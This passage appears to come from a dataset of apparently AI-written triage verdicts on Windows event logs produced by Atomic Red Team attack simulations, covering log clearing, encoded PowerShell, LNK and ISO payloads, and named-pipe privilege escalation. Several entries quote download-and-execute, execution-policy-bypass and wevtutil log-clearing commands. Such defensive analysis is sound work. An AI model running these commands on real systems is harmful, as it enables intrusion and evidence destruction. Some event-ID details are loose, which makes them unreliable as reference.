   - Processes such as `TiWorker.exe`, `TrustedInstaller.exe`, and `WmiPrvSE.exe` are running under system authority accounts and do not show immediate signs of misuse based on the given logs.

### Assessment:
The consistent execution of `wevtutil.exe` for clearing logs, coupled with actions such as the use of specialized privileges (like SeDebugPrivilege) to clear these logs, strongly indicates an attempt to perform and then erase potentially malicious activity. The actions observed around the `admin_test` account—executing system utilities to clear logs—align with behaviors typically intended to obscure an intrusion or administrative abuse.

### Resolution:
**MALICIOUS** - The log activities present clear signs of a potential security breach, with evidence supporting the likelihood of log tampering meant to cover malicious actions by someone with administrative access.

### Guidance on How to Proceed:
1. **Isolate the Affected System:** Temporarily remove Server002 from the network to prevent further malicious activities or exfiltration of data.
2. **Credential Audit:** Review and potentially reset credentials associated with the `admin_test` account and investigate how it was used in such a manner.
3. **Conduct a Full Forensic Investigation:** Investigate to determine the scope of possible unauthorized access or compromise and identify any other affected systems.
4. **Review and Enhance Security Policies:** Ensure that logging is robust, monitored, and alerting is in place for critical events like log clearing and privilege escalation.

Further actions may include coordinating with incident response teams and assessing the need for notifying relevant stakeholders or authorities, depending on the nature and results of the ongoing investigation."
LNK Payload Download,"Upon reviewing the provided event logs, several indicators of potentially malicious activities were identified and warrant further investigation:

1. **Log Clearing Activities**: 
   - The logs show multiple instances of the `wevtutil` command being used to clear several Windows event logs.
   - The `EventID 104` in the System log shows log clearing events by the user `admin_test`, which is indicative of potential log tampering to hide other malicious activities.

2. **Suspicious PowerShell Activity**:
   - The application of PowerShell script with the `Invoke-WebRequest` command to download a file (`test10.lnk`) from a public GitHub repository is suspicious. This command is often used in attack techniques to download and execute payloads.
   - The command then proceeds to execute the downloaded file (`test10.lnk`) and attempts to stop a process named `a.exe`. This could indicate an attempt to halt a security process.
   - This activity aligns with TTPs (Tactics, Techniques, and Procedures) typically associated with lateral movement or payload delivery.

3. **Time Discrepancies**: 
   - There is a noticeable time reset or manipulation around `18:22:25.47 to 18:22:29.67`, which could indicate an attempt to tamper with time settings for evasion purposes.

4. **High-Permission Processes**:
   - There are instances of high-integrity level processes (`whoami.exe`, `wevtutil.exe`, and `powershell.exe`) run by `admin_test`. These processes are being executed with significant privileges, further indicating a risk of exploitation for malicious activities.

Given these observations, I recommend the following resolution:

- **Resolution: MALICIOUS**

### Recommendations:
1. **Containment**: 
   - Monitor and terminate suspicious processes such as the `powershell.exe` execution mentioned.
   - Quarantine any suspected malicious files such as `test10.lnk` and related scripts or executables.

2. **Investigation**: 
   - Conduct a thorough disk and memory forensic analysis for any further signs of compromise.
   - Inspect user `admin_test` account activities, including a review of allowed rights and permissions, as well as any out-of-band activities or accesses.

3. **Mitigation**: 
   - Suggest disabling or restricting remote script executions via PowerShell.
   - Implement stricter privilege access management and audit logs to prevent unauthorized access or misuse.

4. **Review and Fortification**: 
   - Evaluate current security policies and adjust based on identified Lateral Movement and Persistence techniques.
   - Reinforce logging and monitoring solutions to detect similar actions more swiftly in the future.

These steps are critical in both managing the immediate threat and strengthening defenses against future incidents."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,"After carefully analyzing the provided log entries, several points stand out that suggest anomalous and potentially malicious activity:

1. **Event Log Clearing:**
   - The System, Windows PowerShell, and Security event logs were cleared by the user `admin_test` on `Server002` at `2024-10-23 11:45:46.xxx`. This is indicated by the presence of `EventID 104` for the System and Windows PowerShell logs, and `EventID 1102` for the Security log.
   - Clearing event logs is considered suspicious activity, as it is often performed to cover tracks in the case of unauthorized or malicious alterations within the system.

2. **Use of `wevtutil`:**
   - The executable `wevtutil.exe` was used several times to supposedly clear different logs (`Microsoft-Windows-Sysmon`, `Application`, `System`, `Security`, and `Windows PowerShell`).
   - The command-line executions such as `""C:\Windows\system32\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`, followed similar patterns, showing attempts to manage event logs.

3. **Suspicious PowerShell Activity:**
   - The `powershell.exe` process is executed with command-line parameters that suggest encoded commands are used, which is often associated with malicious PowerShell use.
   - The command includes potentially obfuscated parameters to execute with encoded contents, indicated by the `-EncodedCommand` and similar parameters.

4. **Unusual Parent-Child Process Relationships:**
   - Processes such as `wevtutil.exe` and `powershell.exe` are spawned under what might seem normal administrative tasks by `admin_test`, but the timing and combination of these processes with the actions such as log clearing are suspicious.

**Assessment and Resolution:**

**Resolution: MALICIOUS**

Based on the evidence found in the logs, I am confident that the logs indicate malicious activity. The sequence of event log clearing by the admin account, combined with the suspicious use of `wevtutil.exe` and PowerShell with encoded command parameters, strongly suggests an attempt to perform unauthorized actions while obfuscating any records or alerts which might arise through standard monitoring.

**Guidance on How to Proceed:**

1. **Immediate Escalation:**
   - Report the incident to the Incident Response Team for immediate action.
   - Isolate `Server002` from the network to prevent further unauthorized actions or potential data exfiltration.

2. **User Account Review:**
   - Review the `admin_test` account activity, validate its necessity, and confirm whether it is being used by authorized personnel.

3. **Forensic Analysis:**
   - Conduct a full forensic investigation on `Server002` to determine the extent of potential compromise.
   - Recover and analyze cleared log data using backups or shadow copies, if possible.

4. **Restrict `wevtutil` and PowerShell:**
   - Implement application white-listing to restrict the use of `wevtutil.exe` and encoded PowerShell execution unless explicitly needed.
   - Monitor all high-integrity level privileges and account activities for unusual patterns. 

5. **Alert and Monitor:**
   - Set up alerts for any future occurrences of event log clearing or similar patterns of behavior across the organization's systems. 
   - Increase monitoring on server activity similar to that found in the logs and ensure logging and alerting are robust and tamper-proof."
BlackCat pre-encryption cmds with Lateral Movement,"### Detailed Analysis:

The provided logs indicate several potentially malicious actions that occur on Server002. Here's a detailed breakdown of suspicious activities:

1. **PowerShell Activity**:
   - Multiple instances of `PowerShell.exe` (found in process logs) running commands that appear to interact with system settings and copy or execute external payloads. Notably, commands include registry modifications and using PsExec, which is a known tool to execute processes on remote systems. The PowerShell commands involve:
     - Retrieving UUID and modifying symlink behavior.
     - Modifying registry settings of LanmanServer. 
     - Copying and executing PsExec from a suspicious location.
   - These actions resemble the use of post-exploitation frameworks like Atomic Red Team, suggesting an adversary is simulating attack techniques often used in real adversary scenarios.

2. **Clearing of Event Logs**:
   - The logs show multiple `EventID 1102` and `EventID 104` entries, indicating the clearing of event logs from the Security and System channels by `admin_test`. Clearing logs is a classic sign of attempts to cover tracks following potentially malicious activity.

3. **Command-Line Executions**:
   - We observe the usage of `wevtutil.exe` to clear logs, `cmd.exe` for command execution, `fsutil.exe` for file system behavior changes, and a `reg.exe` registry modification. These are not typical benign user actions and indicate advanced usage or scripting for system compromise.
   - The use of `conhost.exe` associated with console applications suggests these processes are being managed or masked from a command-line shell, commonly seen when trying to automate or hide operations.

4. **Generated Security Logs**:
   - Multiple Event 4624 (Successful Logon) and Event 4672 (Special Privileges Assigned) indicate SYSTEM account activity granting it an unusually high level of permissions with a diverse range of privileges. Although normal during many system operations, in conjunction with other observed activities, it reinforces potential malicious activity.
   
5. **Microsoft Account Access Attempts**:
   - Multiple login attempts with `ReturnCode 3221226021` indicate failed operations related to authentication or authorization issues. These could be attempts to gain unauthorized access or misconfigurations resulting from the suspicious setup running on the machine.

### Assessment:

The observed activities align with typical signs of malicious behavior due to their nature: unauthorized command executions, advanced manipulation of system features, credential access patterns, and log clearing – all suggesting post-exploitation techniques.

### Resolution:

**MALICIOUS** - The logs provide strong evidence suggesting deliberate and sophisticated malicious activity aimed at compromising the system or mimicking realistic attack scenarios.

### Guidance on How to Proceed:

1. **Immediate Response**:
   - Isolate the affected host from the network to prevent any further malicious activities or lateral movement.
   - Preserve forensic evidence by ensuring all logs and pertinent system files are securely archived for further analysis.

2. **Investigation and Remediation**:
   - Perform a comprehensive forensic analysis to delineate the extent of the compromise and identify any further actions taken by the adversary.
   - Review user and service accounts for unauthorized activities and reset passwords where necessary.
   - Assess network traffic to identify any command-and-control communications or data exfiltration attempts.
   - Conduct a thorough review and update of the system's security configurations, including patches and firewall rules.

3. **Prevention**:
   - Implement robust monitoring to detect similar activities in the future, using tools that flag anomalous behavior.
   - Provide cybersecurity awareness training to administrative users to prevent credential compromise and social engineering attacks.
   - Enhance endpoint protection with solutions that provide protection against PowerShell exploits and unauthorized use of administration tools like PsExec."
Cobalt Strike Lateral Movement (psexec_psh) pipe,"Upon reviewing the provided Windows event logs, I have identified several points of interest, as well as suspicious activities that could potentially indicate malicious behavior. Below is a detailed analysis of the logs:

1. **Suspicious Process Execution:**
   - A series of wevtutil.exe processes (responsible for clearing event logs) were executed shortly before the system, application, and security event logs were cleared. These processes are invoked by the user ""SERVER002\\admin_test"" with high integrity level, which is suspect as legitimate log clearing typically requires administrative action and consent.

2. **Log Clearing Events:**
   - The System log shows event ID 104, indicating the clearing of system logs by ""admin_test.""
   - The Windows PowerShell log was also cleared shortly after by the same user.
   - A Security log entry (event ID 1102) indicates the clearing of the Security log by ""admin_test."" This is particularly concerning, as it suggests an attempt to cover tracks, a common tactic by adversaries attempting to hide malicious activities.

3. **Use of Command-line Tools:**
   - The command line execution record shows potentially unwanted execution via a cmd.exe process that launches executables from a user’s temp directory in the path ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\ExternalPayloads\\build\\namedpipes_executor.exe"". This is generally atypical behavior for a legitimate process and can be indicative of malicious payload execution, as such directories are commonly used by malware.

4. **Presence of Uncommon Processes:**
   - Several processes related to ""namedpipes_executor.exe"", ""namedpipes_server.exe"", and ""namedpipes_client.exe"" are executed. These processes are executed from a temporary directory and are linked to ""AtomicRedTeam"", which is usually associated with penetration testing or red team operations. Without prior knowledge or authorization of such activities, these processes could denote malicious actions.

5. **Processes with Networking Indications:**
   - Processes such as ""WmiPrvSE.exe"" running under ""NT AUTHORITY\\NETWORK SERVICE"" are generally normal for Windows systems. However, given the concurrent suspicious activities, it's essential to verify the legitimacy of these network-based processes.

**Assessment and Conclusion:**

The logs indicate activities consistent with attempts to obfuscate malicious actions via log clearing. The use of wevtutil.exe to clear logs without a clear legitimate rationale, the launching of potential payloads from temporary directories by cmd.exe, and the implication of possibly unauthorized penetration testing tools (e.g., associated with ""AtomicRedTeam"") collectively suggest that the activities are not benign and warrant further investigation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Ensure that the user account ""SERVER002\\admin_test"" is secured and verify if the account's recent activities are authorized.
   - Gather additional context by questioning the account holders and system administrators about recent administrative actions or tests conducted.
   
2. **Further Investigation:**
   - Forensically analyze the system and network activity surrounding the wevtutil.exe executions.
   - Verify the integrity and origin of binaries found in temporary execution directories.
   - Monitor the system for further unauthorized activities.

3. **Preventive Measures:**
   - Implement detailed alerting on event log clearance and execution of scripts or binaries from non-standard directories.
   - Consider applying stricter access controls and enhancing auditing to prevent unauthorized log manipulation.

These steps should help clarify whether the suspicious activities observed represent an ongoing threat and ensure that any security incident is swiftly managed."
Office Generic Payload Download,"### Detailed Analysis of Logs:

**1. Malicious Indicators:**  
- **PowerShell Execution:** The execution of PowerShell with a command involving downloading and executing a script (""Invoke-MalDoc.ps1"") from a publicly available GitHub repository suggests a potential malicious activity. This type of activity is often associated with downloading and executing scripts for malicious purposes, such as running macros that can interact with applications like Word (`Invoke-MalDoc -macroCode`). The execution of PowerShell for downloading scripts is a classic technique used in attacks involving script-based malware and exploitation frameworks.

- **Clearing of Logs:** Events show that logs were cleared from the system at specific times (Security log: EventID 1102, System log: EventID 104). The clearing of event logs is a commonly observed malicious activity when an attacker wants to cover their tracks and remove traces of presence or actions on the system.

**2. Anomalous Behavior:**
- **Event Log Manipulation via wevtutil:** A pattern of commands using `wevtutil.exe` is displayed in the logs (`""wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`, `""wevtutil.exe"" cl Application`, `""wevtutil.exe"" cl System`, `""wevtutil.exe"" cl Security`). This behavior indicates that a user might be attempting to clear or interact with event logs, which directly corresponds with logs being cleared. The use of `wevtutil` to clear logs when closely aligned with other suspicious PowerShell activities highlights potential malicious activity.

**3. Analysis of Other Executions:**
- The logs for executing common and typical system and update functions such as ""MicrosoftEdgeUpdate.exe"" and ""Windows Defender"" updates are seen and can be considered benign with regards to typical system operations.
- Windows processes like `CompatTelRunner.exe` and regular update processes do not raise suspicious flags in isolation.

**Assessment of the Situation:**
The combination of log clearing, suspicious PowerShell activity involving known command-and-control or script execution frameworks, and wevtutil invocations for possibly clearing logs, strongly suggests unauthorized and potentially malicious actions. The indication is that an adversary might be using PowerShell to introduce or execute potentially harmful operations while simultaneously clearing logs to erase their tracks.

**Threats/Risks Identified:**
- Potential execution of malicious scripts via PowerShell, which could compromise the integrity of the system.
- Deletion of critical security logs, indicative of an attempt to hide malicious activities.
- Evidence pointing toward an attempt at persistence and lateral movement using PowerShell scripts.

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Isolate the affected host (Server002) from the network to prevent further spread or data exfiltration.
  - Conduct a comprehensive forensic analysis on the affected machine, focusing on the origin and impact of the malicious script.
  - Review and restore cleared event logs, if possible, using backup solutions or log retention practices.
  
- **Preventive Measures:**
  - Implement strict access controls and monitor for abnormal log and PowerShell activities.
  - Employ solutions that can block and alert on the execution of unauthorized or malicious scripts.
  - Configure logging and alerting policies to ensure detection of log-clearing activities in real-time.

**Resolution: MALICIOUS.**  

Further investigation is warranted to determine the full scope and impact of the compromise. Immediate isolation and forensic analysis of ""Server002"" is recommended to contain and mitigate potential damage."
Create a Process using obfuscated Win32_Process,"**Detailed Analysis:**

1. **PowerShell Logs:**
   - The PowerShell log entries reveal unusual behavior where the script uses `Invoke-WmiMethod` to create a new WMI class (`Win32_Atomic`) and use it to execute `notepad.exe`. This is a method sometimes used by adversaries to execute arbitrary processes and can be an indication of malicious activity, especially if the method or process is not expected or documented in standard procedures.

2. **Application Logs:**
   - The Application log does not show any anomalies directly associated with malicious activities. It merely records a Software Protection Platform Service entry, which is typical for applications managing licenses and activations.

3. **System Logs:**
   - There are entries for clearing event logs (EventID 104), particularly by the user `admin_test`. The clearing of logs can signify an attempt to cover tracks, especially when combined with the PowerShell activities observed.
   - Additionally, the manipulation of system time (EventID 4616) mediates previously recorded timestamps to be altered. This action is suspicious as it may be used in conjunction with log manipulation to modify activity windows or hide traces.

4. **Sysmon Logs:**
   - Frequent use of `wevtutil.exe` with the `cl` (clear log) command across various event channels by `admin_test` aligns with the suspicious log-clearing activities observed in system logs. This enhances the risk profile significantly.
   - Execution of the `whoami.exe` and `hostname.exe` commands can be legitimate but in this context could indicate reconnaissance activities if combined with other suspicious behavior.

5. **Security Logs:**
   - A cleared security log (EventID 1102) further supports the hypothesis of track-covering actions taken, possibly to hide malicious activity or unauthorized access.

**Assessment:**
- The combination of a potentially malicious PowerShell script execution, activity of clearing logs, and time manipulation indicates a potential compromise.
- The activities associated with the user `admin_test` are particularly concerning as they involve actions that can be linked to attempts to obscure activities on the system and executing scripts that are atypical for benign operations.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected host (Server002) to prevent further potential compromise or lateral movement.
- Conduct a thorough examination of user `admin_test` activities and privileges to ensure no unauthorized escalation occurred.
- Review and, if necessary, reset sensitive credentials that might have been exposed.
- Implement enhanced monitoring and alerting for similar PowerShell activities and log-clearing commands across other systems.
- Conduct a comprehensive forensic investigation to detail the extent of the breach and ensure persistent threats are eradicated.
- Review security policies around account use and logging to ensure they are adequate to detect and prevent future incidents."
Create a Process using WMI Query and an Encoded Command,"Upon analyzing the provided Windows event logs, I have identified the following notable and potentially suspicious activities:

1. **Sysmon Logs Analysis:**
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) paired with `conhost.exe` appearing shortly after. Specifically, commands executed with `wevtutil.exe` include clearing logs (`cl CommandLine`), which is often a tactic used by malicious actors to cover their tracks by clearing event logs.
   - Command sequences such as `""cmd.exe"" /c powershell -exec bypass -e <base64encodedcommand>`:
     - This indicates the execution of an obfuscated PowerShell script via a command that bypasses standard execution policies. This pattern is strongly associated with malicious behavior, given that encodings like this are often used to run scripts without detection.
   
2. **System Logs Analysis:**
   - Event ID 104 indicates log file clearing activity, specifically mentioning the clearing of the System and Windows PowerShell event logs by the `admin_test` user. Coupled with corresponding Sysmon logs about `wevtutil.exe` activity, this further solidifies the likelihood of malicious intent.

3. **PowerShell Logs Analysis:**
   - The PowerShell logs show entries correlating with the `bypass` execution flags and encoded commands. This specific combination is commonly leveraged for executing potentially harmful scripts while avoiding typical execution restrictions, making it highly suspicious.

4. **Security Logs Analysis:**
   - The Security log entry with an Event ID 1102 confirms that the security event log was cleared, again by the `admin_test` user, potentially aiding in further activity obfuscation.

**Assessment:**
Based on the analysis above, there are strong indications of malicious activity, notably:
- Usage of `wevtutil.exe` for log clearing.
- Execution of base64-encoded PowerShell commands with execution policy bypass.
- Clearing of crucial event logs, including Security, System, and PowerShell logs.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediate containment should be initiated for the `Server002` system to prevent further activity.
- Conduct a thorough forensic analysis of the system, focusing on discovering any malicious scripts or indicators of compromise.
- Review user permissions and activity logs for user `admin_test`, as their account might have been compromised or misused.
- Examine network traffic during the time surrounding the suspicious activities to identify any data exfiltration or unauthorized communications.
- Implement enhanced monitoring and alerting for PowerShell activities and event log clearings across the network.
- Educate users on identifying signs of compromise and secure credential management, especially for administrative accounts."
WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,"Upon reviewing the provided log entries, several activities are indicative of potentially malicious behavior:

1. **Clearing of Event Logs:**
   - The event with ID 1102 in the Security log indicates that the security event log was cleared by the user `admin_test`. This could be an attempt to cover tracks following malicious activity.

2. **Suspicious Process Creation and Execution:**
   - Several processes were executed using PowerShell with obfuscated or potentially harmful scripts. For instance, the PowerShell application logs reveal that `powershell.exe` was used to download and execute a script from a URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1`), which is a clear indicator of potentially malicious activity. This tactic is often used to bypass security controls and execute malicious payloads.
   - There is also a creation of a service named `svcHighPriv` which involves the execution of a command (`cmd.exe /C echo Uuup! > \\.\pipe\HighPriv`). The use of named pipes for communication and services creation in this context suggests an attempt to escalate privileges or maintain persistence.
   - Sysmon logs contain entries for the creation and execution of several processes like `cmd.exe` and `PowerShell` which initiated high-privilege processes via suspicious command lines.

3. **Execution of Potential Privilege Escalation Techniques:**
   - The events indicate attempts to create and control services (e.g., `New-Service -Name svcHighPriv`). This can be used to escalate privileges by manipulating service configurations to run unauthorized code at elevated levels.

4. **Network and Service Manipulation:**
   - The Sysmon logs show interactions with service management utilities (`sc.exe`) and cmd.exe commands designed to manipulate services, typical of post-exploitation activities where an attacker attempts to control, disable, or create their own services.

5. **Presence of Evasion Techniques:**
   - A common tactic utilized by attackers involves integrating PowerShell scripts with encoded commands or leveraging scripts accessed over the network, which we observe here. Such actions often attempt to evade detection by traditional antivirus solutions.

**Assessment:**
Based on the indicators above, it appears these logs contain evidence of potentially malicious activities:
- The unauthorized clearing of event logs.
- Suspicious use of PowerShell to execute a download and execute potentially malicious code.
- Commands indicating the creation of unauthorized services for privilege escalation.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. Isolate the affected host to prevent further potential exfiltration or lateral movement.
2. Conduct a deeper forensic investigation on the system, focusing on network connections and any remaining indicators of compromise (IOCs).
3. Analyze any found payloads or script contents downloaded from the referenced URLs to comprehend the attack scope and objectives.
4. Review and reinforce security policies and procedures, particularly around scripting and execution policies (e.g., controlling PowerShell execution, enhanced logging).
5. Ensure user account activities, particularly those with administrative privileges, are audited and monitored continuously for anomalies.
6. Alert and educate staff about the incident with a focus on understanding the social engineering or initial access vectors utilized."
WMI Reconnaissance Software,"### Detailed Analysis of Logs

**Security Logs Analysis:**
1. **EventID 1102** - The security log indicates the event logs were cleared by the user `admin_test`. This is a significant red flag, as clearing logs can be an attempt to hide malicious activity.
2. **EventID 4616** - There are two events showing changes in system time, which can be suspicious. Attackers sometimes change timestamps to cover their trails.

**Sysmon Logs Analysis:**
1. **Process Execution (wevtutil.exe)** - The execution of `wevtutil.exe` multiple times (EventID 1 in Sysmon) is used to clear logs. Specifically, commands like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`, `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`, and `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""` were executed. These are clear indicators of log clearing activities, which can suggest cover-up attempts.
2. **Process Execution (cmd.exe, conhost.exe, wmic.exe)** - Commands executed (`cmd.exe /c wmic qfe get description,installedOn /format:csv`) are not harmful on their own, but their context around log clearing activities can suggest enumeration or collection of system patch details, possibly for exploitation.
3. **EventID 1 - Various Processes** - It includes processes like `hostname.exe`, `whoami.exe`, and `cmd.exe`. These could be benign but in conjunction with other suspicious behaviors, they indicate possible reconnaissance activities.

**System Logs Analysis:**
1. **EventID 104** - System logs were cleared by `admin_test` as well, similar suspicious behavior as noted in the security logs.

**Application Logs Analysis:**
- Normal operation of the Software Protection Platform Service with no direct suspicious activities recorded here. However, the timing coincides with other critical events.

**Resolution:**
The pattern of behavior across these logs points towards:
- **Log clearing activities using `wevtutil.exe`.**
- **Anomalous time change events.**

These activities strongly suggest an attempt to either hide actions or interfere with system logs. While not outright harmful on their own, these actions are typical of malicious behavior.

### Assessment
- **Threat**: There is a high potential risk that the server `Server002` has been compromised, potentially with actions hidden by log tampering.
- **Risk**: Unauthorized access and potential data exfiltration or system manipulation.

### Guidance on How to Proceed
1. **Immediate Forensics**: Isolate `Server002` from the network and conduct a thorough forensic analysis of the system and memory to identify any malware or suspicious activities.
2. **Review User Activity**: Analyze `admin_test` user activities around the times of these logs to confirm legitimacy and rule out account compromise.
3. **Check Network Logs**: Identify any suspicious outbound connections correlating with the events.
4. **Strengthen Monitoring**: Enhance monitoring and adjust SIEM rules to trigger alerts on similar events in the future.

Final analysis label: **MALICIOUS**"
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,"Upon reviewing the provided Windows event logs, several observations can help determine whether the activity on the host (Server002) is benign, suspicious, or malicious.

1. **PowerShell Execution with Encoded Command:**
   - The Windows event log includes multiple instances where PowerShell was executed with parameters that might be suspicious. Specifically, the use of `-CommandLineSwitchType Hyphen` and `-EncodedCommandParamVariation E -Execute -ErrorAction Stop` indicates the use of an encoded command. Encoded commands executed by PowerShell can often be associated with attempts to obscure malicious activities.
   - Encoded commands might help an attacker conceal their activities or execute scripts without being detected easily.

2. **Event Log Clearing:**
   - There are events indicating that logs were cleared deliberately. For example, events 1102 (Security log cleared), 104 (System and Windows PowerShell logs cleared) show that the user `admin_test` cleared the logs. Clearing logs is typically considered suspicious behavior as it can signify an attempt to remove traces of any unauthorized or malicious actions from the system.

3. **Use of Eventing Utility (wevtutil):**
   - The log entries indicate the use of `wevtutil` for clearing logs. The commands reviewed (`wevtutil cl Microsoft-Windows-Sysmon/Operational`, `wevtutil cl System`, etc.) and the associated user `SERVER002\\admin_test` suggest that these activities may not be part of routine administrative maintenance, especially when log clearing is seen alongside encoded PowerShell command execution.

4. **Executed Commands with High Integrity Level:**
   - Many of the processes were executed with `High Integrity Level`, which in combination with the actions described above, might suggest privilege escalation or the use of elevated permissions to perform unauthorized actions.

Based on these observations, there is strong evidence pointing towards potentially malicious behavior. The combination of encoded PowerShell usage, log clearing (especially Security logs), and the use of elevated privileges suggest an attempt to execute hidden activities while attempting to cover tracks.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediate isolation of Server002 should be considered to prevent any potential spread of a malicious actor across the network.
- Conduct a thorough forensic investigation of the system to understand the full scope of activities performed.
- Review other systems for similar patterns of behavior to ensure the malicious actions are not part of a larger compromise.
- Evaluate credentials and privileges of the user `admin_test` to ensure no leakage or misuse.
- Reassess security policies surrounding PowerShell execution and log management to improve the detection and prevention of similar future incidents."
OSTap Style Macro Execution,"Based on the analysis of the provided log entries from various Windows Event Logs, there are clear signs of potentially malicious activity.

1. **PowerShell Activity**:
   - Multiple instances of `powershell.exe` are executing a script from an external source (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`). This script appears to be part of a known repository used for red-team exercises or simulating attack scenarios.
   - The command involves creating a file `C:\\Users\\Public\\art.jse` intended to be executed with `cscript.exe`, which can be indicative of script-based malware attempting to execute.

2. **Event Log Cleared Entries**:
   - Logs have been cleared across multiple channels (System, Security, and Windows PowerShell). The clearing of logs can be indicative of an attempt to cover tracks and is commonly observed following malicious activity to hinder forensic investigation.

3. **Suspicious Command Line**:
   - The use of `wevtutil.exe` to clear event logs indicates an attempt to erase traces of the PowerShell execution. The command line used with `wevtutil.exe` corroborates the log clearance effort seen across different event logs.

Given these observations, including the execution of scripts from external sources and subsequent log cleaning activities, the actions recorded in these logs strongly suggest potentially malicious behavior. The execution of a PowerShell script from a remote location known to host attack simulation tests, coupled with the erasure of logs, further supports this conclusion.

**Final Assessment**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate `Server002` from the network to prevent further dissemination or data exfiltration.
- Conduct a full forensic analysis, focusing on recovering artifacts from memory and disk to understand the full scope of the compromise.
- Review logs from other systems for similar patterns to identify any lateral movement or further compromise within the network.
- Implement security measures to block further access to the URL associated with the PowerShell script execution.
- Consider notifying incident response teams and management stakeholders about the potential breach, and prepare communication based on organizational policies."
Malicious Execution from Mounted ISO Image,"After thoroughly reviewing the provided Windows event logs across different channels, several key findings indicate malicious activity:

1. **PowerShell Logs**:
   - A command was executed using `powershell.exe` that downloads a file from `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso`. The file is saved to the temporary directory and then mounted as a disk image. The subsequent command navigates to the mounted path and executes a linked file named `calc.exe.lnk`. 
   - The use of `IEX (iwr ...)` to execute internet-retrieved scripts is highly indicative of potentially malicious behavior. Such method is often used in malware delivery to execute payloads from the internet directly.

2. **Sysmon Logs**:
   - The process `calc.exe` was executed by `cmd.exe` with the command line `cmd.exe /q /c calc.exe` after the ISO contents were mounted. Such activity strongly suggests the execution of unexpected or malicious processes.
   - Multiple cleanup of various event logs noticed, such as the Application event log using `wevtutil.exe`.

3. **Suspicious Log Clearing**:
   - The Security log and System log were cleared (`EventID: 1102` and `104`), which is often a tactic used by attackers to cover their tracks after performing unauthorized activities. This action was executed by the user `admin_test`.

4. **Security Logs**:
   - There were numerous unsuccessful credential accesses for an account resembling a Microsoft account (`MicrosoftAccount:user=02txoixylodcstop`), which was attempted several times with the return code indicating failure (`ReturnCode: 3221226021`), suggesting probing or failed authentication attempts.

Overall, combining the attempted downloading and execution of external files via PowerShell, log clearing operations, and unauthorized credential access attempts, the evidence indicates that this host has experienced malicious activity. The PowerShell command execution is of particular concern as it directly correlates with known tactics for deploying malware.

**Resolution: MALICIOUS**

**Guidance and Next Steps**:
- Immediately isolate the affected host from the network to prevent further potentially harmful actions.
- Conduct a thorough forensic analysis of the host to identify any other malicious payloads or persistence mechanisms left behind.
- Reset or review permissions for user `admin_test`, including a review of any additional users created.
- Review network traffic logs for any communications from the affected host to external IPs or domains during the time of the incident for further compromise indicators.
- Restore the system from a trusted backup if possible, and redeploy security baselines.
- Advise all users to change their passwords, especially for administrative or service accounts. 
- Consider tightening perimeter defenses and employing stricter monitoring for PowerShell activity, such as using enhanced logging or constrained language mode."
Cobalt Strike Artifact Kit pipe,"Upon reviewing the provided logs, several points of interest and potential indicators of malicious activity emerge. 

### Suspicious or Anomalous Behavior:

1. **Event Logs Clearance:**
   - The logs indicate that the event logs on the system (including System, Windows PowerShell, and Security logs) were cleared by the user `SERVER002\admin_test`. Specifically, these log clearance actions occurred within seconds at `07:16:07`.
   - Sysmon EventID 104 and EventID 1102 accompany these actions, indicating potential anti-forensic behavior as log clearance is generally not a routine operation and is often indicative of an attempt to cover tracks after unauthorized or suspicious activities.

2. **Execution of Eventing Command Line Utility (wevtutil.exe):**
   - The Sysmon logs show multiple executions of `wevtutil.exe` clearing various event logs (`System`, `Security`, `Application`, `Microsoft-Windows-Sysmon/Operational`, and `Windows PowerShell`). 
   - Such actions suggest intentional and aggressive log manipulation efforts.

3. **Unusual Process Hierarchy and Command Execution:**
   - `cmd.exe` executed an unusual command, pointing to potential test execution of atomic red exercises or simulated attack scenarios using known security tools like `namedpipes_executor.exe` from `AtomicRedTeam`. 
   - While tools like Atomic Red Team are used for security testing or training, their presence without proper context or authorization could be a potential indicator of illicit activity.

### Indications of Malicious Activity or Compromise:

- The combination of cleared logs, the presence, and use of `wevtutil.exe` for log clearance, and executing potentially suspicious scripts or binaries suggest an attempt to cover footprints of potentially malicious actions.
- Although no direct evidence of payload execution or system compromise is visible, the deliberate attempt to remove trace logs and history from the system is strongly suspicious.

### Assessment and Risk:

- **Threat Level:** High – The aggressive log clearance behavior and scripting hints at potential malicious intent.
- **Operational Risk:** If not part of an authorized pen-test or similar exercise, there's a risk of ongoing unauthorized access or system tampering.

### Guidance:

1. **Immediate Investigation:**
   - Verify whether these logs clearance actions were scheduled or part of an authorized test by consulting with all relevant IT and security teams.
   - If unauthorized, treat the situation as a potential incident and escalate it per the incident response protocol.

2. **Restoration and Monitoring:**
   - Restore logs from secure backups if available to inspect previous activities.
   - Increase monitoring and logging rigorously, especially focusing on high-integrity and sensitive areas.

3. **Audit Permissions:**

### Resolution:

**SUSPICIOUS** - The cues from the logs do not decisively prove malicious activity but indicate highly suspicious behavior warranting deeper investigation."
Pipe Creation - PsExec Tool Execution From Suspicious Locations,"In reviewing the provided Windows event logs, several indications of potentially malicious activity stand out, suggesting a potential security breach. Here is a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Event Logs Cleared (Multiple Times):**
   - The system log shows the event `104 - LogFileCleared` multiple times for different channels, done by the user `admin_test` originated from `Server002`. Specifically, events are cleared for the `System`, `Windows PowerShell`, and likely other logs. This action can often be an indicator of malicious activity attempting to cover its tracks.

